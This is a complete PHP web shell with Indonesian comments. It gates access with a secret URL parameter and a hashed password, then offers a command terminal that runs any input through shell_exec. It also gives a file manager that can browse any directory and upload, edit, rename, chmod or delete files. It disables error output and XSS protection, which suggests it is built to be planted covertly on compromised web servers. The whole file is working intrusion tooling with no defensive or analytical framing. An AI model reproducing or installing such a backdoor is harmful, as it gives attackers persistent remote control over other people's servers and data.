<?php
session_start(); // Memulai sesi
header("X-XSS-Protection: 0");
@ob_start();
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);

// Password yang diharapkan (dihash menggunakan password_hash)
$hashed_password = '$2a$12$pr7DWdPi8I6lEQH6JseceePDsFc7hB4yMUC414gpYXMjITwRSZadq'; 

// Cek apakah pengguna sudah login atau tidak
if (!isset($_SESSION['loggedin'])) {
    if (!isset($_GET['skxteam']) || $_GET['skxteam'] !== 'senyumgan') {
        echo '<html><body><center>';
        echo '<font color="red">Access Denied: Invalid Parameter</font>';
        echo '</center></body></html>';
        exit;
    }

    if (!isset($_POST['password'])) {
        showPasswordForm();
        exit;
    } else {
        if (!password_verify($_POST['password'], $hashed_password)) {
            echo '<html><body><center>';
            echo '<font color="red">Access Denied: Invalid Password</font>';
            exit;
        } else {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF'] . "?skxteam=senyumgan");
            exit;
        }
    }
} else {
    showMainContent();
}

function showPasswordForm() {
    echo '<html><body><center>';
    echo '<h2>Please Enter Password to Access</h2>';
    echo '<form method="POST">';
    echo 'Password: <input type="password" name="password" required />';
    echo '<input type="hidden" name="skxteam" value="senyumgan" />';
    echo '<input type="submit" value="Submit" />';
    echo '</form>';
    echo '</center></body></html>';
}

function showMainContent() {
    echo '<html><center><body>';
    echo "<font color='green'>" . php_uname() . "</font>";
    echo '<br><br>';

    echo '<h2>Terminal</h2>';
    if (isset($_POST['cmd'])) {
        $cmd = $_POST['cmd'];
        echo '<pre>' . shell_exec($cmd) . '</pre>';
    }

    echo '<form method="POST">';
    echo '<input type="text" name="cmd" style="width:80%;" placeholder="Enter command" required />';
    echo '<input type="submit" value="Execute" />';
    echo '</form>';

    echo '<br><br>';

    $currentDir = isset($_GET['j']) ? $_GET['j'] : getcwd();
    $currentDir = str_replace('\\', '/', $currentDir);
    $paths = explode('/', $currentDir);

    foreach($paths as $id => $pat){
        if($pat == '' && $id == 0){
            echo '<a href="?skxteam=senyumgan&j=/">/</a>';
            continue;
        }
        if($pat == '') continue;
        echo '<a href="?skxteam=senyumgan&j=';
        for($i = 0; $i <= $id; $i++){
            echo "$paths[$i]";
            if($i != $id) echo "/";
        }
        echo '">'.$pat.'</a>/';
    }

    echo '<br><br><br>';
    echo '<form enctype="multipart/form-data" method="POST">';
    echo '<input type="file" name="file" required />';
    echo '<input type="submit" value="Upload" />';
    echo '</form>';

    if(isset($_FILES['file'])){
        $uploadPath = $currentDir . '/' . $_FILES['file']['name'];
        if(@move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)){
            @chmod($uploadPath, 0644);
            echo '<br><font color="green">File uploaded successfully</font><br/>';
        } else {
            echo '<br><font color="red">Failed to upload the file</font><br/>';
        }
    }

    echo '<br>Current Directory: ' . htmlspecialchars($currentDir);
    echo '<br><br>';

    if (isset($_GET['edit'])) {
        editFile($currentDir);
    } else if (isset($_GET['rename'])) {
        renameFile($currentDir);
    } else if (isset($_GET['chmod'])) {
        chmodFile($currentDir);
    } else if (isset($_GET['delete'])) {
        deleteFile($currentDir);
    } else {
        listDirectory($currentDir);
    }

    echo '</center></body></html>';
}

function listDirectory($currentDir) {
    $scandir = @scandir($currentDir);

    if ($scandir) {
        echo '<table border="1" cellpadding="3" cellspacing="1" align="center">';
        echo '<tr><th>Type</th><th>Name</th><th>Size</th><th>Actions</th></tr>';
        
        foreach($scandir as $item){
            if(@is_dir("$currentDir/$item") && $item != '.' && $item != '..'){
                echo "<tr>";
                echo '<td>Directory</td>';
                echo "<td><a href=\"?skxteam=senyumgan&j=$currentDir/$item\">$item</a></td>";
                echo '<td></td>';
                echo '<td></td>';
                echo "</tr>";
            }
        }

        foreach($scandir as $item){
            if(@is_file("$currentDir/$item")){
                $size = @filesize("$currentDir/$item") / 1024;
                $size = round($size, 2) . ' KB';
                echo "<tr>";
                echo '<td>File</td>';
                echo "<td><a href=\"?skxteam=senyumgan&filesrc=$currentDir/$item&j=$currentDir\">$item</a></td>";
                echo "<td>$size</td>";
                echo "<td>
                        <a href=\"?skxteam=senyumgan&j=$currentDir&edit=$item\">Edit</a> | 
                        <a href=\"?skxteam=senyumgan&j=$currentDir&rename=$item\">Rename</a> | 
                        <a href=\"?skxteam=senyumgan&j=$currentDir&chmod=$item\">Chmod</a> | 
                        <a href=\"?skxteam=senyumgan&j=$currentDir&delete=$item\" onclick=\"return confirm('Are you sure?')\">Delete</a>
                      </td>";
                echo "</tr>";
            }
        }

        echo '</table>';
    } else {
        echo '<br><font color="red">Unable to access directory</font><br/>';
    }
}

function editFile($currentDir) {
    $filePath = $currentDir . '/' . $_GET['edit'];
    if (isset($_POST['filecontent'])) {
        file_put_contents($filePath, $_POST['filecontent']);
        echo '<br><font color="green">File edited successfully</font><br/>';
    }
    echo '<form method="POST">';
    echo '<textarea name="filecontent" style="width:100%; height:400px;">' . htmlspecialchars(file_get_contents($filePath)) . '</textarea><br>';
    echo '<input type="submit" value="Save" />';
    echo '</form>';
}

function renameFile($currentDir) {
    $oldName = $currentDir . '/' . $_GET['rename'];
    if (isset($_POST['newname'])) {
        $newName = $currentDir . '/' . $_POST['newname'];
        if (rename($oldName, $newName)) {
            echo '<br><font color="green">File renamed successfully</font><br/>';
        } else {
            echo '<br><font color="red">Failed to rename file</font><br/>';
        }
    }
    echo '<form method="POST">';
    echo 'New Name: <input type="text" name="newname" value="' . htmlspecialchars($_GET['rename']) . '" required />';
    echo '<input type="submit" value="Rename" />';
    echo '</form>';
}

function chmodFile($currentDir) {
    $filePath = $currentDir . '/' . $_GET['chmod'];
    if (isset($_POST['permissions'])) {
        $permissions = octdec($_POST['permissions']);
        if (chmod($filePath, $permissions)) {
            echo '<br><font color="green">Permissions changed successfully</font><br/>';
        } else {
            echo '<br><font color="red">Failed to change permissions</font><br/>';
        }
    }
    echo '<form method="POST">';
    echo 'Permissions: <input type="text" name="permissions" value="' . substr(sprintf('%o', fileperms($filePath)), -4) . '" required />';
    echo '<input type="submit" value="Change" />';
    echo '</form>';
}

function deleteFile($currentDir) {
    $filePath = $currentDir . '/' . $_GET['delete'];
    if (@unlink($filePath)) {
        echo '<br><font color="green">File deleted successfully</font><br/>';
    } else {
        echo '<br><font color="red">Failed to delete file</font><br/>';
    }
}
?>
